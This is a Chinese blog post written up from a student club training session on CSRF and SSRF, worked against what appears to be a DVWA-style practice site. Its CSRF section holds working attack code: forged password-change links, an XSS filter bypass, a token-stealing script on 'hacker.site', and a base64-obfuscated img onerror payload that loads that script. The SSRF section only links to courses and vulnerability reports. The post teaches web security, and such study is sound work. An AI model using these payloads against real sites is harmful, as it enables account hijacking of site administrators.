---
layout: post
title: "CSRF+SSRF入门(社团培训记录)"
tags: [group]
author: wqpw
---

突然想记录下。

## CSRF

```text
CSRF，全名 Cross Site Request Forgery，跨站请求伪造。易与 XSS 混淆，对于 CSRF，其两个关键点是跨站点的请求与请求的伪造。因为用户的敏感操作的每一个参数都可以被攻击者获知，攻击者可以伪造一个完全一样的请求以用户的身份达到恶意目的，即CSRF攻击。
```

![1](/assets/pcs1.png)

这个页面有一个修改管理员密码的功能。

![2](/assets/pcs2.png)

试一下，我们可以得知修改密码的请求是

`http://justforfun.site/vulnerabilities/csrf/?password_new=新密码&password_conf=新密码&Change=Change`

所以如果我们想把管理员的密码变成我们期望的密码，就可以[社工](https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/2136830)(社会工程学，动词社工。以前认识一个人关于这个挺有一套的，暂且不表)管理员点击下面的链接(把密码改成hacker)：

`http://justforfun.site/vulnerabilities/csrf/?password_new=hacker&password_conf=hacker&Change=Change`

但是这样太显眼了，管理员~~不一定~~一定不会上当，所以我们需要想办法伪装掩饰一下。

比如这样

![3](/assets/pcs3.png)

只要一打开hacker.site，浏览器就会自动发送修改密码的请求。这样只要骗管理员打开hacker.site就行，成功率有不少提升。

当然，因为只是一个GET请求，所以[方法](https://ctf-wiki.github.io/ctf-wiki/web/csrf/)有很多：

```html
(HTML中能设置src/href等链接地址的标签都可以发起一个GET请求)
<link href="">
<img src="">
<img lowsrc="">
<img dynsrc="">
<meta http-equiv="refresh" content="0; url=">
<iframe src="">
<frame src="">
<script src=""></script>
<bgsound src=""></bgsound>
<embed src=""></bgsound>
<video src=""></video>
<audio src=""></audio>
<a href=""></a>
<table background=""></table>
......
还有CSS样式中的：
@import ""
background:url("")
......
```

下面看一个难一点的：

```php
<?php
if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
        ......下略
```

这段代码里检查了`$_SERVER['SERVER_NAME']`是否在`$_SERVER['HTTP_REFERER']`中出现，然后才会进入修改密码的流程，所以首先我们来康康这两东西是啥。

|||
--|:--:|
`$_SERVER['SERVER_NAME']`|返回当前运行脚本所在的服务器的主机名|
`$_SERVER['HTTP_REFERER']`|链接到当前页面的前一页面的 URL 地址|
|||

所以只要想办法让referer里有`justforfun.site`就可以通过检测了。

除了伪造referer，最简单的方法就是结合同站的XSS。

![4](/assets/pcs4.png)

这里的XSS保护`只过滤了一次<script>`，所以只要类似`<scr<script>ipt>alert(1)</script>`这样就可以弹个框。

不过这里的CSRF还用不上`<script>`，用前面的img标签就行。

![5](/assets/pcs5.png)

然后更难一点

![6](/assets/pcs6.png)

这个会先检测token(令牌)，如果发送的token和系统生成的token不一样就不会改密码，所以我们要想办法取得系统生成的token。而在这里访问一次修改密码的页面就会生成一个token放在html中，所以利用XSS把页面生成的token偷出来就可以进行CSRF攻击了。

下面是CSRF的exp (在hacker.site根目录下，文件名hack.js):

```javascript
/* 相关教程：http://www.w3school.com.cn/ajax/index.asp */
var hack1 = new XMLHttpRequest();
var token = '';
var url = 'http://justforfun.site/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change&user_token=';

hack1.open("GET", "/vulnerabilities/csrf/",true);
hack1.send();
hack1.onreadystatechange=function() {
  //请求发送成功后提取token并修改密码  
  if(hack1.readyState==4 && hack1.status==200) {
      token = hack1.responseText.match(/[0-9a-z]{32}/)[0]; //是一个长为32由0-9a-z组成的字符串
      var hack2 = new XMLHttpRequest();
      hack2.open("GET", url + token, true); //发送修改密码的请求
      hack2.send();
  }
}

```

然后是用于XSS的payload:

```html
<img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8vaGFja2VyLnNpdGUvaGFjay5qcyc='))>
```

解密后会执行
`s=createElement('script');body.appendChild(s);s.src='http://hacker.site/hack.js`

即向body内插入一个`<script src='http://hacker.site/hack.js'>`，从而执行`hack.js`中的代码。

效果如下：

![7](/assets/pcs7.png)

那么这里的CSRF入门大概先说到这，当然网上有很多资料。
嗯，现在来看两个例子：

[漏洞科普 对于XSS和CSRF你究竟了解多少](https://www.freebuf.com/articles/web/39234.html)

文中有一些小错误但影响不大。

[绕过Facebook CSRF防护机制实现账户劫持](https://www.freebuf.com/vuls/195814.html)

[“借刀杀人”之CSRF拿下盗图狗后台](https://www.freebuf.com/column/159411.html)

## 然后是SSRF

[来听个课](https://www.bilibili.com/video/av37393329)

[然后看点资料](https://ctf-wiki.github.io/ctf-wiki/web/ssrf/)

单纯的ssrf用处不是很大，一般都会想办法结合其他信息或者漏洞来产生更大的价值。

[谷歌SSRF漏洞解析：利用谷歌应用工具发现谷歌内部DNS信息](https://www.freebuf.com/articles/network/128508.html)

多学习，然后能看懂的漏洞报告、分析就会变多，然后技术自然会上去。

以前印象挺深的一个

[百度某个从SSRF到内网WebShell](http://www.anquan.us/static/bugs/wooyun-2015-099070.html)

结束。
